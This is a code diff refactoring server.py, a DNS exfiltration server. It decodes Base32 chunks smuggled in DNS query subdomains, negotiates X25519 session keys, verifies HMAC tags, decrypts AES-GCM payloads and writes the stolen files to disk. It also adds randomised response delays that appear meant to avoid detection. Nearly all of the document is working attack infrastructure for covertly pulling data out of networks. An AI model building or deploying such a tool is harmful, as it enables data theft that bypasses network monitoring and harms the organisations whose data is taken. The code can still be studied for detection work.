@@ -2,71 +2,121 @@
 """
 Module Name: server.py
 
-Description: DNS exfiltration server that receives Base32-encoded, AES-GCM encrypted data chunks in DNS queries,
-performs ECDH key exchange with a client-supplied ephemeral key, reassembles the full Base32 string,
-decodes and decrypts the blob, then writes the plaintext to disk.
+Description:
+    DNS exfiltration server with ECDH key exchange, AES-GCM decryption,
+    Base32 decoding, and HMAC verification for integrity and authenticity.
 
-Implements Perfect Forward Secrecy by using X25519 key exchange and per-session AES-GCM keys.
+    - Accepts client ephemeral public key via DNS subdomain, derives shared
+      AES and HMAC keys using X25519 and HKDF.
+    - Collects Base32-encoded chunks, applies padding, decodes payload bytes.
+    - Validates HMAC tag, decrypts AES-GCM ciphertext, and writes output file.
 
 Author: John Burns
 Date: 2025-05-02
-Version: 2.1 (ECDH key negotiation, AES-GCM, Base32 decoding with DNS-safe key chunks)
+Version: 2.4 (Refactored for clarity)
 """
 
-import os
-import threading
-import struct
-import socket
-import base64
 import argparse
+import base64
+import hashlib
+import hmac
 import logging
-import time
+import os
 import random
+import socket
+import threading
+import time
 from collections import defaultdict
 
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import x25519
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from dnslib import DNSRecord, RR, QTYPE, A
 from dotenv import load_dotenv, find_dotenv
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.primitives.asymmetric import x25519
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
-from cryptography.hazmat.primitives import hashes
 
-# Load environment variables
+# Configure environment and logging
 load_dotenv(find_dotenv())
-
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('server')
 
-# In-memory session state
+# === Session State ===
 fragments_by_id = defaultdict(dict)
-expected_chunks = defaultdict(int)
 last_seen = defaultdict(lambda: time.time())
 shared_keys = {}
 client_key_buffers = defaultdict(list)
 
-# === Key Derivation ===
-def derive_shared_key(server_private_key, client_pub_bytes):
-    client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
-    shared_secret = server_private_key.exchange(client_pub)
-    return HKDF(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=None,
-        info=b'dns-exfil'
-    ).derive(shared_secret)
 
-# === Decrypt payload ===
-def decrypt_payload(key, blob):
+# === Cryptographic Utilities ===
+def derive_shared_key(server_priv, client_pub_bytes):
+    """
+    Derive per-session AES and HMAC keys via ECDH and HKDF.
+    Returns (aes_key, hmac_key).
+    """
+    client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
+    shared_secret = server_priv.exchange(client_pub)
+    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared_secret)
+    logger.debug("Derived shared key material")
+    return material[:32], material[32:]
+
+
+def decrypt_aes_gcm(aes_key, blob):
+    """
+    Decrypt AES-GCM blob (nonce||ciphertext+tag) and return plaintext.
+    """
     nonce = blob[:12]
     ciphertext = blob[12:]
-    return AESGCM(key).decrypt(nonce, ciphertext, None)
+    return AESGCM(aes_key).decrypt(nonce, ciphertext, associated_data=None)
 
-# === DNS Helpers ===
-def parse_dns_query(data):
+
+# === Base32 & HMAC ===
+def pad_base32_string(b32_string):
+    """
+    Add '=' padding to Base32 string so its length is a multiple of 8.
+    """
+    pad_len = (8 - len(b32_string) % 8) % 8
+    return b32_string.upper() + ('=' * pad_len)
+
+
+def decode_and_split(blob_b32):
+    """
+    Decode Base32-encoded blob and split into payload and HMAC tag.
+    Returns (payload_bytes, tag_bytes) or (None, None) on error.
+    """
+    try:
+        raw = base64.b32decode(blob_b32)
+    except Exception as e:
+        logger.error(f"Base32 decode failed: {e}")
+        return None, None
+
+    if len(raw) < 32:
+        logger.error("Decoded data too short for HMAC tag")
+        return None, None
+
+    return raw[:-32], raw[-32:]
+
+
+def verify_hmac(payload, tag, hmac_key):
+    """
+    Compute and compare HMAC-SHA256 tag for payload using hmac_key.
+    Returns True if valid.
+    """
+    expected = hmac.new(hmac_key, payload, hashlib.sha256).digest()
+    logger.debug(f"Expected HMAC: {expected.hex()}")
+    logger.debug(f"Received HMAC: {tag.hex()}")
+    if not hmac.compare_digest(expected, tag):
+        logger.error("HMAC verification FAILED")
+        return False
+
+    logger.info("HMAC verification succeeded")
+    return True
+
+
+# === DNS Handlers ===
+def parse_qname(data):
+    """
+    Extract QNAME from DNS query packet bytes.
+    """
     offset = 12
     labels = []
     while True:
@@ -74,128 +124,133 @@ def parse_dns_query(data):
         if length == 0:
             break
         offset += 1
-        labels.append(data[offset:offset+length].decode('ascii'))
+        labels.append(data[offset:offset + length].decode('ascii'))
         offset += length
     return '.'.join(labels)
 
-# === Handle and track chunks ===
-def process_chunk(identifier, index, total, payload, args):
-    idx = int(index)
-    fragments_by_id[identifier][idx] = payload
-    expected_chunks[identifier] = int(total)
+
+def send_dns_response(data, addr, sock):
+    """
+    Send a minimal DNS A response (192.0.2.1) for given request.
+    """
+    req = DNSRecord.parse(data)
+    reply = req.reply()
+    reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A('192.0.2.1'), ttl=60))
+    sock.sendto(reply.pack(), addr)
+
+
+# === Main Request Logic ===
+def handle_key_exchange(identifier, payload):
+    """
+    Collect Base32-encoded client ephemeral public key fragments,
+    decode when complete, derive shared AES/HMAC keys, store them.
+    Returns True when keys established.
+    """
+    client_key_buffers[identifier].extend(payload.split('.'))
+    b32 = ''.join(client_key_buffers[identifier])
+    if len(b32) >= 52:
+        padded = pad_base32_string(b32)
+        client_pub = base64.b32decode(padded)
+        aes_key, hmac_key = derive_shared_key(handle_request.server_priv, client_pub)
+        shared_keys[identifier] = (aes_key, hmac_key)
+        logger.info(f"[{identifier}] Session keys established")
+        return True
+    return False
+
+
+def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
+    """
+    Store payload chunk, and when all received, assemble and process.
+    """
+    fragments_by_id[identifier][int(index)] = payload
     last_seen[identifier] = time.time()
-    logger.info(f"[{identifier}] Received chunk {idx+1}/{total}")
 
     if len(fragments_by_id[identifier]) == int(total):
-        logger.info(f"[{identifier}] All chunks received. Reassembling...")
-        reassemble_and_save(identifier, args)
+        b32_str = ''.join(fragments_by_id[identifier][i] for i in sorted(fragments_by_id[identifier]))
+        padded = pad_base32_string(b32_str)
+        payload_bytes, tag = decode_and_split(padded)
+        if payload_bytes is None:
+            return
 
-# === Assemble and decrypt file ===
-def reassemble_and_save(identifier, args):
-    fragments = fragments_by_id.pop(identifier)
-    full_b32 = ''.join(fragments[i] for i in sorted(fragments))
-    padded = full_b32 + '=' * ((8 - len(full_b32) % 8) % 8)
+        aes_key, hmac_key = shared_keys.get(identifier, (None, None))
+        if not verify_hmac(payload_bytes, tag, hmac_key):
+            return
 
-    try:
-        encrypted = base64.b32decode(padded.upper())
-    except Exception as e:
-        logger.error(f"[{identifier}] Base32 decode failed: {e}")
-        return
+        try:
+            plaintext = decrypt_aes_gcm(aes_key, payload_bytes)
+            logger.info(f"[{identifier}] Decryption succeeded, length={len(plaintext)} bytes")
+        except Exception as e:
+            logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
+            return
 
-    try:
-        key = shared_keys.pop(identifier)
-        plaintext = decrypt_payload(key, encrypted)
-    except Exception as e:
-        logger.error(f"[{identifier}] Decryption failed: {e}")
-        return
+        out_dir = args.output_dir
+        os.makedirs(out_dir, exist_ok=True)
+        file_path = os.path.join(out_dir, f"{identifier}.bin")
+        with open(file_path, 'wb') as f:
+            f.write(plaintext)
+        logger.info(f"[{identifier}] File written: {file_path}")
 
-    os.makedirs(args.output_dir, exist_ok=True)
-    path = os.path.join(args.output_dir, f"{identifier}.bin")
-    with open(path, 'wb') as f:
-        f.write(plaintext)
-    logger.info(f"[{identifier}] Saved file: {path}")
 
-# === DNS Response ===
-def respond(data, addr, sock):
-    try:
-        req = DNSRecord.parse(data)
-        reply = req.reply()
-        reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=60))
-        sock.sendto(reply.pack(), addr)
-    except Exception as e:
-        logger.error(f"Response error: {e}")
-
-# === Main DNS request handler ===
 def handle_request(data, addr, sock, args):
-    try:
-        qname = parse_dns_query(data).rstrip('.')
-    except Exception:
-        logger.warning("Invalid DNS query")
-        return
-
+    """
+    Main DNS packet handler: routes key exchange or data chunk logic.
+    """
+    qname = parse_qname(data).rstrip('.')
     if not qname.endswith(args.domain):
         return
 
     prefix = qname[:-(len(args.domain) + 1)]
-
-    try:
-        identifier, index, total, payload = prefix.split('-', 3)
-    except ValueError:
-        logger.warning(f"Malformed subdomain: {prefix}")
+    parts = prefix.split('-', 3)
+    if len(parts) != 4:
         return
 
+    identifier, index, total, payload = parts
     time.sleep(random.uniform(args.low, args.high) / 1000.0)
 
     if index == '0' and total == '0':
-        client_key_buffers[identifier].extend(payload.split('.'))
-        key_b32 = ''.join(client_key_buffers[identifier])
-        if len(key_b32) >= 52:  # Base32-encoded 32-byte key needs 52 chars
-            padded = key_b32 + '=' * ((8 - len(key_b32) % 8) % 8)
-            try:
-                pubkey = base64.b32decode(padded.upper())
-                shared_keys[identifier] = derive_shared_key(args.server_key, pubkey)
-                logger.info(f"[{identifier}] Received ephemeral public key")
-            except Exception as e:
-                logger.error(f"[{identifier}] Key exchange failed: {e}")
+        # key exchange
+        handle_key_exchange(identifier, payload)
     else:
-        process_chunk(identifier, index, total, payload, args)
+        # data chunks
+        handle_data_chunk(identifier, index, total, payload, args, sock, addr)
 
-    respond(data, addr, sock)
+    send_dns_response(data, addr, sock)
 
-# === Cleanup old sessions ===
+
+# === Cleanup Thread ===
+# Bind server private key into handle_request for convenience
+handle_request.server_priv = None
+
+
 def cleanup_stale(ttl=600, interval=60):
+    """
+    Periodically remove sessions idle longer than TTL.
+    """
     while True:
         now = time.time()
-        expired = [k for k, t in last_seen.items() if now - t > ttl]
-        for k in expired:
-            fragments_by_id.pop(k, None)
-            expected_chunks.pop(k, None)
-            last_seen.pop(k, None)
-            shared_keys.pop(k, None)
-            client_key_buffers.pop(k, None)
-            logger.info(f"[{k}] Session expired and removed.")
+        for ident, timestamp in list(last_seen.items()):
+            if now - timestamp > ttl:
+                fragments_by_id.pop(ident, None)
+                shared_keys.pop(ident, None)
+                client_key_buffers.pop(ident, None)
+                last_seen.pop(ident, None)
+                logger.info(f"[{ident}] Session expired and cleaned up")
         time.sleep(interval)
 
-# === Parse CLI args ===
-def get_args():
-    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (ECDH + AES-GCM)")
-    parser.add_argument('--port', type=int, default=5300)
-    parser.add_argument('--output-dir', default='output')
-    parser.add_argument('--low', type=int, default=100)
-    parser.add_argument('--high', type=int, default=1500)
-    parser.add_argument('--domain', default='xf.example.com')
-    parser.add_argument('--server-key', default=os.getenv("SERVER_PRIVATE_KEY"), help='Path to X25519 private key')
-    return parser.parse_args()
 
-# === Server Entry Point ===
 def start_server(args):
+    """
+    Initialize server state, load private key, and begin listening.
+    """
     if not args.server_key:
-        raise ValueError("Missing server private key path (use CLI or .env)")
+        raise ValueError("Missing server private key path")
 
     with open(args.server_key, 'rb') as f:
-        args.server_key = x25519.X25519PrivateKey.from_private_bytes(f.read())
+        priv = x25519.X25519PrivateKey.from_private_bytes(f.read())
+    handle_request.server_priv = priv
 
-    threading.Thread(target=cleanup_stale, daemon=True).start()
+    thread = threading.Thread(target=cleanup_stale, daemon=True)
+    thread.start()
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('', args.port))
@@ -210,9 +265,18 @@ def start_server(args):
             except socket.timeout:
                 continue
     except KeyboardInterrupt:
-        logger.info("Server stopping.")
+        logger.info("Shutting down server")
     finally:
         sock.close()
 
+
 if __name__ == '__main__':
-    start_server(get_args())
+    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (ECDH + AES-GCM + HMAC)")
+    parser.add_argument('--port', type=int, default=5300)
+    parser.add_argument('--output-dir', default='output')
+    parser.add_argument('--low', type=int, default=100)
+    parser.add_argument('--high', type=int, default=1500)
+    parser.add_argument('--domain', default='xf.example.com')
+    parser.add_argument('--server-key', default=os.getenv('SERVER_PRIVATE_KEY'), help='Path to X25519 private key file')
+    args = parser.parse_args()
+    start_server(args)
